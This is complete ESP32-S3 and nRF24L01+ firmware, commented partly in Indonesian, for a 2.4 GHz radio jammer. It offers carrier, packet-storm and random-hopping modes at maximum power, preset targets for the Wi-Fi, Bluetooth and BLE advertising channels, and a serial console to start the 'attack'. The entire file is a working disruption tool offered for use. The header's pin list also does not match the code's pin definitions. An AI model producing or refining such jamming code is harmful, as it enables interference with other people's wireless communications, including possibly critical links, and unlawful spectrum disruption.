/*
 * ███████╗███████╗██████╗ ██╗  ██╗███████╗ █████╗ ██╗   ██╗
 * ██╔════╝██╔════╝██╔══██╗██║  ██║██╔════╝██╔══██╗╚██╗ ██╔╝
 * ███████╗█████╗  ██████╔╝███████║███████╗███████║ ╚████╔╝ 
 * ╚════██║██╔══╝  ██╔══██╗██╔══██║╚════██║██╔══██║  ╚██╔╝  
 * ███████║███████╗██║  ██║██║  ██║███████║██║  ██║   ██║   
 * ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝   
 * 
 * ESP32-S3 RF24 AGGRESSIVE JAMMER
 * * Menggabungkan carrier, packet storm, dan random hopping
 * * Tanpa delay mikro yang tidak perlu - kecepatan maksimum
 * * Auto-recovery dan watchdog internal
 * 
 * PINOUT (sama seperti versi dasar, namun pin dapat diubah di #define)
 * ESP32-S3   -> nRF24L01+
 * 3.3V       -> VCC
 * GND        -> GND
 * GPIO5      -> CSN (SS)   <-- sesuaikan
 * GPIO4      -> CE         <-- sesuaikan
 * GPIO6      -> SCK        <-- sesuaikan
 * GPIO7      -> MOSI       <-- sesuaikan
 * GPIO8      -> MISO       <-- sesuaikan
 * 
 * Library: RF24 by TMRh20 (v1.4.2+)
 * 
 * PERINTAH SERIAL BARU:
 *   aggressive on/off   - Aktifkan mode agresif (tanpa jeda antar channel)
 *   turbo on/off        - Mode turbo: ganti channel setiap 50 µs (super cepat)
 *   storm on/off        - Kirim packet acak di setiap channel saat hopping
 *   blast               - Ledakan carrier tanpa henti pada satu channel (ignore hopping)
 *   randhop on/off      - Random hopping (bukan linear)
 *   kill                - Matikan semua transmisi dan reset radio ke mode idle
 *   channel <num>       - Tetap sama
 *   power <level>       - Tetap
 *   rate <speed>        - Tetap
 *   hopdwell <us>       - Dwell time (dalam mikrodetik) – minimum 1 µs
 *   hoprange <min><max> - Tetap
 *   band wifi           - Jamming khusus band Wi-Fi (ch 1-73 / 2401-2473 MHz)
 *   band bt             - Jamming khusus band Bluetooth (ch 2-80 / 2402-2480 MHz)
 *   band bleadv         - Jamming khusus 3 kanal advertising BLE (ch 2/26/80)
 *   band all            - Jamming seluruh band 2.4 GHz
 *   start / stop        - Tetap
 *   status / help       - Tetap
 * 
 * JIKA TIDAK ADA PERINTAH, MODE DEFAULT: AGGRESSIVE + RANDHOP + STORM = ON
 */

#include <SPI.h>
#include <RF24.h>

// ============ PIN DEFINISI ============
#define CE_PIN   7
#define CSN_PIN  6
#define SCK_PIN  12
#define MOSI_PIN 11
#define MISO_PIN 13

// ============ KONFIGURASI DASAR ============
#define MIN_CHANNEL         0
#define MAX_CHANNEL         125
#define DEFAULT_POWER       RF24_PA_MAX
#define DEFAULT_RATE        RF24_2MBPS    // 2Mbps = lebih agresif
#define MIN_DWELL_US        1             // 1 mikrodetik = hampir tanpa jeda
#define MAX_DWELL_US        1000
#define DEFAULT_DWELL_US    10            // 10 µs untuk agresif

// ===== PRESET BAND TARGET (frekuensi = 2400 + RF24 channel MHz) =====
#define WIFI_MIN_CH         1     // 2401 MHz - awal band Wi-Fi (ch 1-13)
#define WIFI_MAX_CH         73    // 2473 MHz - akhir band Wi-Fi
#define BT_MIN_CH           2     // 2402 MHz - awal band Bluetooth
#define BT_MAX_CH           80    // 2480 MHz - akhir band Bluetooth (BR/EDR + BLE)

// ============ OBJEK RADIO ============
RF24 radio(CE_PIN, CSN_PIN);

// ============ STATUS & KONFIGURASI ============
bool jamming = false;
bool aggressiveMode = true;      // Default agresif
bool turboMode = false;          // Super cepat, abaikan dwell
bool stormMode = true;           // Kirim packet saat hopping
bool randomHop = true;           // Random hopping, bukan linear
bool blastMode = false;          // Ignore hopping, tetap di satu channel

int currentChannel = 80;          // default tengah
rf24_pa_dbm_e powerLevel = DEFAULT_POWER;
rf24_datarate_e dataRate = DEFAULT_RATE;
String powerStr = "MAX";
String rateStr = "2MBPS";

unsigned long hopDwell = DEFAULT_DWELL_US;
int hopMin = MIN_CHANNEL;
int hopMax = MAX_CHANNEL;
String targetBand = "ALL";      // Kategori target: ALL / WIFI / BT / BLE-ADV
const int bleAdvCh[3] = {2, 26, 80};  // 3 kanal advertising BLE (2402/2426/2480 MHz)

// ============ BUFFER UNTUK PACKET STORM ============
uint8_t randomPayload[32];
uint8_t pipeAddress[5] = {0xE7, 0xE7, 0xE7, 0xE7, 0xE7}; // dummy

// ============ WATCHDOG ============
hw_timer_t *watchdogTimer = NULL;
bool watchdogTriggered = false;

// ============ PROTOTYPE FUNGSI ============
void processSerialCommand(String cmd);
void startJamming();
void stopJamming();
void setChannel(int ch);
void applyRadioConfig();
void jamLoop();
void generateRandomPayload();
void IRAM_ATTR watchdogISR();

// ============================================
// SETUP
// ============================================
void setup() {
    Serial.begin(115200);
    delay(500);
    Serial.println("Type 'help' for command list.");

    // Inisialisasi SPI
    SPI.begin(SCK_PIN, MISO_PIN, MOSI_PIN, CSN_PIN);

    // Inisialisasi radio
    if (!radio.begin()) {
        Serial.println("   FATAL: nRF24L01+ is not detected!");
        Serial.println("   Check wiring. System HANG.");
        while (1) { delay(1000); }
    }

    // Konfigurasi agresif
    radio.setPALevel(DEFAULT_POWER);
    radio.setDataRate(DEFAULT_RATE);
    radio.setAutoAck(false);
    radio.setRetries(0, 0);
    radio.setCRCLength(RF24_CRC_DISABLED);
    radio.setChannel(currentChannel);
    radio.setPayloadSize(32);
    radio.openWritingPipe(pipeAddress);

    // Generate payload acak awal
    generateRandomPayload();

    Serial.println("RF24 is ready (default)");
    Serial.println("   Power: MAX, Rate: 2MBPS, Dwell: 10µs, RandomHop: ON, Storm: ON");
    Serial.println("⚡ Ketik 'start' untuk meluncurkan serangan.\n");

    // Setup hardware watchdog (ESP32-S3) - akan reset jika loop berhenti > 3 detik
    watchdogTimer = timerBegin(0, 80, true); // 1 tick = 1 µs (80 MHz clock)
    timerAttachInterrupt(watchdogTimer, &watchdogISR, true);
    timerAlarmWrite(watchdogTimer, 3000000, false); // 3 detik
    timerAlarmEnable(watchdogTimer);
}

// ============================================
// LOOP UTAMA
// ============================================
void loop() {
    // Reset watchdog setiap iterasi (tandai loop masih hidup)
    timerWrite(watchdogTimer, 0);  // reset counter

    // Baca perintah serial
    if (Serial.available() > 0) {
        String cmd = Serial.readStringUntil('\n');
        processSerialCommand(cmd);
    }

    // Jalankan jamming jika aktif
    if (jamming) {
        jamLoop();
    } else {
        // Jika tidak jamming, tetap refresh radio (idle)
        delay(10);
    }

    // Jika watchdog trigger, restart otomatis (tidak terjadi jika loop berjalan)
    if (watchdogTriggered) {
        Serial.println("WATCHDOG TRIGGERED! Restarting...");
        ESP.restart();
    }
}

// ============================================
// JAMMING LOOP - INTI AGRESIF
// ============================================
void jamLoop() {
    if (blastMode) {
        // Mode BLAST: carrier terus menerus pada satu channel
        radio.startConstCarrier(powerLevel, currentChannel);
        // Tidak ada delay, loop akan terus menerus mempertahankan carrier
        // tapi kita harus tetap memberi kesempatan untuk membaca serial,
        // jadi kita hanya delay 1 µs agar tidak memonopoli CPU.
        delayMicroseconds(1);
        return;
    }

    // Mode normal (hopping atau fixed)
    if (randomHop && !blastMode) {
        // Random hopping: pilih channel acak dalam range
        int ch;
        if (targetBand == "BLE-ADV") {
            // Fokus hanya pada 3 kanal advertising BLE: 2402 / 2426 / 2480 MHz
            ch = bleAdvCh[random(0, 3)];
        } else {
            ch = random(hopMin, hopMax + 1);
        }
        setChannel(ch);
    } else {
        // Linear sweep atau fixed (jika hopping mati)
        if (randomHop == false && jamming) {
            // Linear sweep dari hopMin ke hopMax
            static int sweepChannel = hopMin;
            setChannel(sweepChannel);
            sweepChannel++;
            if (sweepChannel > hopMax) sweepChannel = hopMin;
        } else {
            // Fixed channel (hopping off, random off) – gunakan currentChannel
            setChannel(currentChannel);
        }
    }

    // Kirim CARRIER (selalu aktif)
    radio.startConstCarrier(powerLevel, radio.getChannel());

    // Jika stormMode aktif, kirim packet acak setelah carrier
    if (stormMode) {
        // Kirim 5 packet dengan payload acak untuk menambah noise
        for (int i = 0; i < 5; i++) {
            generateRandomPayload();
            radio.write(randomPayload, 32);
        }
    }

    // Jeda: jika turboMode, gunakan dwell = 1 µs; jika tidak, pakai hopDwell
    unsigned long dwell = turboMode ? MIN_DWELL_US : hopDwell;
    if (dwell > 0) {
        delayMicroseconds(dwell);
    } else {
        // Jika dwell 0, tetap beri kesempatan minimal
        delayMicroseconds(1);
    }

    // Hentikan carrier sebentar agar bisa beralih channel (sangat singkat)
    radio.stopConstCarrier();
    // Tidak ada delay tambahan, langsung lanjut ke channel berikutnya
}

// ============================================
// FUNGSI BANTUAN
// ============================================
void setChannel(int ch) {
    if (ch < hopMin) ch = hopMin;
    if (ch > hopMax) ch = hopMax;
    currentChannel = ch;
    radio.setChannel(ch);
}

void applyRadioConfig() {
    radio.setPALevel(powerLevel);
    radio.setDataRate(dataRate);
    radio.setAutoAck(false);
    radio.setRetries(0, 0);
    radio.setCRCLength(RF24_CRC_DISABLED);
    radio.setPayloadSize(32);
    radio.openWritingPipe(pipeAddress);
}

void generateRandomPayload() {
    for (int i = 0; i < 32; i++) {
        randomPayload[i] = random(0, 256);
    }
}

void IRAM_ATTR watchdogISR() {
    watchdogTriggered = true;
}

// ============================================
// SERIAL COMMAND PROCESSOR (DIPERLUAS)
// ============================================
void processSerialCommand(String cmd) {
    cmd.trim();
    cmd.toLowerCase();

    if (cmd == "start") {
        startJamming();
    }
    else if (cmd == "stop") {
        stopJamming();
    }
    else if (cmd.startsWith("channel ")) {
        int ch = cmd.substring(8).toInt();
        if (ch >= MIN_CHANNEL && ch <= MAX_CHANNEL) {
            currentChannel = ch;
            if (jamming) {
                setChannel(currentChannel);
            }
            Serial.println("Channel fixed: " + String(currentChannel));
        } else {
            Serial.println("Channel invalid (0-125)");
        }
    }
    else if (cmd.startsWith("power ")) {
        String level = cmd.substring(6);
        level.toUpperCase();
        if (level == "MAX") { powerLevel = RF24_PA_MAX; powerStr = "MAX"; }
        else if (level == "HIGH") { powerLevel = RF24_PA_HIGH; powerStr = "HIGH"; }
        else if (level == "LOW") { powerLevel = RF24_PA_LOW; powerStr = "LOW"; }
        else if (level == "MIN") { powerLevel = RF24_PA_MIN; powerStr = "MIN"; }
        else { Serial.println("Use MAX/HIGH/LOW/MIN"); return; }
        if (jamming) applyRadioConfig();
        Serial.println("Power: " + powerStr);
    }
    else if (cmd.startsWith("rate ")) {
        String rate = cmd.substring(5);
        rate.toUpperCase();
        if (rate == "250KBPS") { dataRate = RF24_250KBPS; rateStr = "250KBPS"; }
        else if (rate == "1MBPS") { dataRate = RF24_1MBPS; rateStr = "1MBPS"; }
        else if (rate == "2MBPS") { dataRate = RF24_2MBPS; rateStr = "2MBPS"; }
        else { Serial.println("Use 250KBPS/1MBPS/2MBPS"); return; }
        if (jamming) applyRadioConfig();
        Serial.println("⚡ Rate: " + rateStr);
    }
    else if (cmd == "aggressive on") {
        aggressiveMode = true;
        if (jamming) Serial.println("Aggressive mode ON (dwell minimal)");
        else Serial.println("Aggressive mode ON");
    }
    else if (cmd == "aggressive off") {
        aggressiveMode = false;
        if (jamming) Serial.println("Aggressive mode OFF (dwell normal)");
        else Serial.println("Aggressive mode OFF");
    }
    else if (cmd == "turbo on") {
        turboMode = true;
        Serial.println("TURBO MODE ON (dwell = 1 µs)");
    }
    else if (cmd == "turbo off") {
        turboMode = false;
        Serial.println("TURBO MODE OFF");
    }
    else if (cmd == "storm on") {
        stormMode = true;
        Serial.println("PACKET STORM ON");
    }
    else if (cmd == "storm off") {
        stormMode = false;
        Serial.println("PACKET STORM OFF");
    }
    else if (cmd == "randhop on") {
        randomHop = true;
        Serial.println("RANDOM HOPPING ON");
    }
    else if (cmd == "randhop off") {
        randomHop = false;
        Serial.println("RANDOM HOPPING OFF (linear sweep)");
    }
    else if (cmd == "blast on") {
        blastMode = true;
        Serial.println("BLAST MODE ON (carrir unstopable on " + String(currentChannel) + ")");
        if (jamming) {
            radio.startConstCarrier(powerLevel, currentChannel);
        }
    }
    else if (cmd == "blast off") {
        blastMode = false;
        Serial.println("BLAST MODE OFF");
        if (jamming) {
            radio.stopConstCarrier();
        }
    }
    else if (cmd == "kill") {
        stopJamming();
        radio.stopConstCarrier();
        radio.powerDown();
        Serial.println("Radio is killed. type 'start' to reinitialize.");
    }
    else if (cmd.startsWith("hopdwell ")) {
        unsigned long d = cmd.substring(9).toInt();
        if (d >= MIN_DWELL_US && d <= MAX_DWELL_US) {
            hopDwell = d;
            Serial.println("Dwell: " + String(hopDwell) + " µs");
        } else {
            Serial.println("Dwell range: 1-1000 µs");
        }
    }
    else if (cmd.startsWith("hoprange ")) {
        String rest = cmd.substring(9);
        rest.trim();
        int sp = rest.indexOf(' ');
        if (sp > 0) {
            int lo = rest.substring(0, sp).toInt();
            int hi = rest.substring(sp + 1).toInt();
            if (lo >= MIN_CHANNEL && hi <= MAX_CHANNEL && lo <= hi) {
                hopMin = lo; hopMax = hi;
                Serial.println("Range hopping: " + String(hopMin) + "-" + String(hopMax));
            } else {
                Serial.println("Range is invalid! Must be within 0-125 and min <= max.");
            }
        } else {
            Serial.println("Format: hoprange <min> <max>");
        }
    }
    else if (cmd.startsWith("band ")) {
        String b = cmd.substring(5);
        b.trim();
        b.toLowerCase();
        if (b == "wifi") {
            targetBand = "WIFI";
            hopMin = WIFI_MIN_CH; hopMax = WIFI_MAX_CH;
            currentChannel = (WIFI_MIN_CH + WIFI_MAX_CH) / 2;
            Serial.println("Target band: WIFI (ch " + String(hopMin) + "-" + String(hopMax) + " = 2401-2473 MHz)");
        }
        else if (b == "bt" || b == "bluetooth") {
            targetBand = "BT";
            hopMin = BT_MIN_CH; hopMax = BT_MAX_CH;
            currentChannel = (BT_MIN_CH + BT_MAX_CH) / 2;
            Serial.println("Target band: BLUETOOTH (ch " + String(hopMin) + "-" + String(hopMax) + " = 2402-2480 MHz)");
        }
        else if (b == "bleadv") {
            targetBand = "BLE-ADV";
            hopMin = BT_MIN_CH; hopMax = BT_MAX_CH;
            currentChannel = bleAdvCh[0];
            randomHop = true;   // pastikan random hopping on
            Serial.println("Target: BLE ADVERTISING (ch 2 / 26 / 80 = 2402 / 2426 / 2480 MHz)");
        }
        else if (b == "all" || b == "full") {
            targetBand = "ALL";
            hopMin = MIN_CHANNEL; hopMax = MAX_CHANNEL;
            currentChannel = (MIN_CHANNEL + MAX_CHANNEL) / 2;
            Serial.println("Target band: ALL (ch " + String(hopMin) + "-" + String(hopMax) + ")");
        }
        else {
            Serial.println("Band not recognized! Use: wifi, bluetooth(bt), bleadv, all");
            return;
        }
        // Nonaktifkan blast agar hopping bisa menyapu band tsb
        blastMode = false;
        if (jamming) {
            setChannel(currentChannel);
        }
    }
    else if (cmd == "status") {
        Serial.println("=== STATUS ===");
        Serial.println("nRF24L01+ : " + String(radio.isChipConnected() ? "✅ CONNECTED" : "❌ NOT DETECTED"));
        Serial.println("Jamming   : " + String(jamming ? "ACTIVE" : "STOPPED"));
        Serial.println("Channel   : " + String(currentChannel));
        Serial.println("Power     : " + powerStr);
        Serial.println("Rate      : " + rateStr);
        Serial.println("Mode      : " + String(aggressiveMode ? "AGGRESSIVE" : "NORMAL"));
        Serial.println("Turbo     : " + String(turboMode ? "ON" : "OFF"));
        Serial.println("Storm     : " + String(stormMode ? "ON" : "OFF"));
        Serial.println("RandomHop : " + String(randomHop ? "ON" : "OFF (linear)"));
        Serial.println("Blast     : " + String(blastMode ? "ON" : "OFF"));
        Serial.println("HopDwell  : " + String(hopDwell) + " µs");
        Serial.println("HopRange  : " + String(hopMin) + "-" + String(hopMax));
        Serial.println("TargetBand: " + targetBand);
        Serial.println("=== END STATUS ===");
    }
    else if (cmd == "help" || cmd == "bantuan") {
        Serial.println("=== COMMAND LIST (AGGRESSIVE) ===");
        Serial.println("start / stop          - Start / stop jamming");
        Serial.println("channel <num>         - Set channel (0-125)");
        Serial.println("power <MAX/HIGH/LOW/MIN>");
        Serial.println("rate <250KBPS/1MBPS/2MBPS>");
        Serial.println("aggressive on/off     - Set aggressive mode (dwell minimal)");
        Serial.println("turbo on/off          - Dwell = 1 µs (override aggressive)");
        Serial.println("storm on/off          - Send random packets on each hop");
        Serial.println("randhop on/off        - Random hopping (default) atau linear sweep");
        Serial.println("blast on/off          - Carrier is on one channel (ignore hopping)");
        Serial.println("hopdwell <us>         - Dwell time (1-1000 µs)");
        Serial.println("hoprange <min> <max>  - Range hopping");
        Serial.println("band <wifi/bt/bleadv/all> - Specific band jamming (Wi-Fi, Bluetooth, BLE advertising, or all)");
        Serial.println("kill                  - Kill all transmissions and power down radio");
        Serial.println("status / help         - Info / help command list");
        Serial.println("=== END ===");
    }
    else {
        Serial.println("Unknown command. type 'help' for list of commands.");
    }
}

// ============================================
// FUNGSI START/STOP JAMMING
// ============================================
void startJamming() {
    if (jamming) {
        Serial.println("Jamming is running.");
        return;
    }
    // Pastikan radio aktif
    radio.powerUp();
    applyRadioConfig();
    jamming = true;
    Serial.println("Jamming is started with Aggressive Mode!");
    Serial.println("   Power: " + powerStr + ", Rate: " + rateStr);
    Serial.println("   HopRange: " + String(hopMin) + "-" + String(hopMax) + ", Dwell: " + String(hopDwell) + " µs");
    Serial.println("   RandomHop: " + String(randomHop ? "ON" : "OFF") + ", Storm: " + String(stormMode ? "ON" : "OFF"));
    if (blastMode) {
        Serial.println("   BLAST MODE aktif – carrier konstan di channel " + String(currentChannel));
    }
}

void stopJamming() {
    if (!jamming) {
        Serial.println("Jamming sudah berhenti.");
        return;
    }
    radio.stopConstCarrier();
    jamming = false;
    Serial.println("Jamming Stopped.");
}